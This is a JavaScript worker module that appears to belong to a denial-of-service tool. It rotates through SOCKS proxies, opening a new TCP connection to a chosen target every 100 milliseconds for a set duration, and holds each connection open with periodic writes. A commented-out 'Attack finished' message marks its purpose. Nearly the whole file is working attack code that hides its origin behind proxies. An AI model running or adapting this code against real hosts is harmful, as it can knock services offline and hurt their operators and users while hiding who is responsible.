import { parentPort, workerData } from "worker_threads";
import { SocksProxyAgent } from "socks-proxy-agent";
import net from "net";

export function createAgent(proxy) {
  if (proxy.protocol !== "socks4" && proxy.protocol !== "socks5") {
    throw new Error("Unsupported proxy protocol for agent: " + proxy.protocol);
  }

  const uri = `${proxy.protocol}://${
    proxy.username && proxy.password
      ? `${proxy.username}:${proxy.password}@`
      : ""
  }${proxy.host}:${proxy.port}`;

  return new SocksProxyAgent(uri);
}

export function randomString(length) {
  let result = "";
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

const DEFAULT_SOCKET_CONFIG = {
  host: "127.0.0.1",
  port: 1080,
  timeout: 5000,
};

export function createTcpClient(
  proxy,
  socketConfig = DEFAULT_SOCKET_CONFIG,
  callback
) {
  if (proxy.protocol !== "socks4" && proxy.protocol !== "socks5") {
    throw new Error(
      "Unsupported proxy protocol for TCP client: " + proxy.protocol
    );
  }

  const socket = new net.Socket();
  const proxyAgent = createAgent(proxy);
  const config = { ...DEFAULT_SOCKET_CONFIG, ...socketConfig };

  socket.setTimeout(config.timeout);

  socket.connect(
    { host: config.host, port: config.port, agent: proxyAgent },
    () => {
      if (callback) callback(socket);
      socket["open"] = true;
    }
  );

  socket.on("close", () => {
    socket["open"] = false;
  });

  socket.on("timeout", () => {
    socket.destroy();
    socket["open"] = false;
  });

  return socket;
}

const tcpTest = () => {
  const { target, proxies, duration, sillyMessage } = workerData;
  const [targetHost, targetPort] = target.split(":");
  const port = parseInt(targetPort, 10);
  const fixedTarget = target.startsWith("http") ? target : `tcp://${target}`;

  const packetDelay = 100;

  if (isNaN(port)) throw new Error("Invalid port: Should be a number");
  if (port < 1 || port > 65535)
    throw new Error("Invalid port: Should be between 1 and 65535");

  let totalPackets = 0;
  const startTime = Date.now();

  const sendPacket = async (proxy) => {
    const socket = createTcpClient(proxy, { host: targetHost, port: port });

    socket.on("connect", () => {
      totalPackets++;

      const message = `Hello from Big Chungus`;
      //socket.write(message);

      parentPort.postMessage({
        log: `📨 Packet sent from ${proxy.protocol}://${proxy.host}:${proxy.port}`,
        totalPackets,
      });
            parentPort.postMessage({
        log: `to ${fixedTarget} `,
        totalPackets,
      });
            parentPort.postMessage({
        log: `Message sent: ${message}`,
        totalPackets,
      });
      const interval = setInterval(() => {
        if (socket.writable && socket["open"]) {
          socket.write(sillyMessage);
          parentPort.postMessage({
            log: `📨 Sent random: ${sillyMessage}`,
            totalPackets,
          });
        } else {
          clearInterval(interval);
        }
      }, 3000);
    });

    socket.on("error", (err) => {
      parentPort.postMessage({
        log: `❌ Packet failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${err.message}`,
        totalPackets,
      });
    });
  };

  const interval = setInterval(() => {
    const elapsedTime = (Date.now() - startTime) / 1000;

    if (elapsedTime >= duration) {
      clearInterval(interval);
      //parentPort.postMessage({ log: "Attack finished", totalPackets });
      process.exit(0);
    }

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    sendPacket(proxy);
  }, packetDelay);
};

if (workerData) {
  tcpTest();
}